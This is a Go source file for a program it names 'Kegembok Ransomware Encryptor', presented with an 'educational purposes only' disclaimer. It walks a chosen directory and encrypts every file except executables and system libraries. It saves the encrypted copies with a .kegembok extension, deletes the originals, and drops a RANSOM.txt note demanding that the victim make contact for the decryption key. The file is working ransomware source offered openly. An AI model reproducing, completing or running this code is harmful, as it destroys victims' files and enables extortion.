package main

/*
	For Educational Purposes Only
	Script by Dwiyan with Luv luv <3
*/

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"

	"flag"

	"github.com/dwiyantech/kegembok/utils"
)

func main() {
	fmt.Printf("Kegembok Ransomware Encryptor v1.0 by dwiyantech \n" +
		"Note : This Ransomware is for educational Purposes only\n" +
		"Author not responsible for any consequences that may occur.\n\n",
	)
	pathToEncrypt := flag.String("targetdir", "", "Target to Encrypt Directory")
	key := flag.String("key", "kegembok-cuy", "Key used for to Encrypt Files")
	contact := flag.String("contact", "kegembok-ransomware", "Key used for to Encrypt Files")

	flag.Parse()
	if *pathToEncrypt == "" {
		fmt.Println(*pathToEncrypt)
		usage()
		os.Exit(2)
	}

	exploreEncryptDirectory(*pathToEncrypt, *key, *contact)

}

func usage() {
	fmt.Printf("Usage : \n--target-dir [target_path_directory] (Mandatory)\n--key [string_key_toencrypt] (default: kegembok-cuy)\n\n")
}

func exploreEncryptDirectory(pathDirectory string, key string, contact string) {

	err := filepath.Walk(pathDirectory, func(path string, info os.FileInfo, err error) error {
		return recursiveEncryptPath(path, key, info, err, contact)
	})
	if err != nil {
		panic(err)
	}

}

func recursiveEncryptPath(path string, key string, f os.FileInfo, err error, contact string) error {
	if err != nil {
		fmt.Println("Error visiting path Skipping:", path)

	}

	stringForExcludeExtensions := ".exe$|.dll$|.sys$|.kegembok$"

	resultBool, err := regexp.MatchString(stringForExcludeExtensions, path)

	if err != nil {
		fmt.Println("Error Regex path Skipping:", path)

	}

	if !resultBool {
		keynya := utils.GenerateKeyFromStr(key)
		enc, errBool := utils.EncryptFile(path, keynya)
		if !errBool {
			fmt.Println("Encrypting Files:", path)
			os.WriteFile(path+".kegembok", enc, 0666)
			os.Remove(path)
		} else {
			ransomNote := "Your Important files are encrypted.\nThis Just Test Only No Worries \nContact " + contact + " to get the decrypt key."
			os.WriteFile(path+"/RANSOM.txt", []byte(ransomNote), 0644)
		}
	}

	return nil
}
